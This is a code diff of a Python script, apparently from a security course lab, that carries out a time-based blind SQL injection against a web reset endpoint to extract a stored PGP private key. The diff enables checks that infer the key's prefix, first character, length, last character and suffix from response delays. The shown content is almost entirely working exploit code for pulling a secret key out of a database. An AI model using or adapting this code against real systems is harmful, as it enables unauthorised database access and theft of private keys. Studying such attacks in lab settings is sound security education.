@@ -13,6 +13,8 @@ API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
 API_RUNS = 10
 THRESHOLD_SECONDS = 0.3
 COUNTER_DELAY = 10000000
+PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
+SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"
 
 
 def check_payload_true(normal_reponse_time, sql_payload, threshold):
@@ -36,6 +38,7 @@ def measure_response_time(url, input):
     # print(f"Response: {r.text}")
     end = time.perf_counter()
     return end - start
+
 
 def measure_avg_response_time(url, input):
     request_times = []
@@ -63,30 +66,25 @@ def discover_char(normal_reponse_time, key_index):
 
 
 def chunk_verification(normal_reponse_time):
-    prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
-    sql_payload = build_sql_payload(f"substr(key,1,{len(prefix)})=='{prefix}'")
+    sql_payload = build_sql_payload(f"substr(key,1,{len(PREFIX)})=='{PREFIX}'")
     if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
-        print("🚀 Prefix check passed\n")
-    #
-    # sql_payload = build_sql_payload("substr(key,1,1)=='-'")
-    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
-    #
-    # sql_payload = build_sql_payload(f"substr(key,{key_length - 2},{key_length-2})=='-'")
-    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
-    #
-    # suffix = "-----END PGP PRIVATE KEY BLOCK-----"
-    # sql_payload = build_sql_payload(f"substr(key,{key_length - len(suffix)},{key_length})=='{suffix}'")
-    # if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
-    #     print("🚀 Suffix check passed\n")
+        print("\n🚀 Prefix check passed")
 
-    # sql_payload = build_sql_payload(f"substr(key,1,1)>'{chr(ord('-') - 1)}'")  # 45
-    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
-    #
-    # sql_payload = build_sql_payload(f"substr(key,1,1)=='{chr(ord('-'))}'")  # 45
-    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
-    #
-    # sql_payload = build_sql_payload(f"substr(key,6,1)=='{chr(ord('B'))}'")
-    # check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
+    sql_payload = build_sql_payload("substr(key,1,1)=='-'")
+    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+        print("\n🚀 First character check passed")
+
+    key_length = 3508
+    if (check_payload_true(normal_reponse_time, build_sql_payload("LENGTH(key)==" + key_length.__str__()), THRESHOLD_SECONDS)):
+        print("\n🚀 Key Length : " + key_length.__str__())
+
+    sql_payload = build_sql_payload(f"substr(key,{key_length - 2},1)=='-'")
+    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+        print("\n🚀 Last character check passed")
+
+    sql_payload = build_sql_payload(f"substr(key,{key_length - len(SUFFIX) + 1})=='{SUFFIX}'")
+    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+        print("\n🚀 Suffix check passed")
 
 
 def sql_injection_attack():
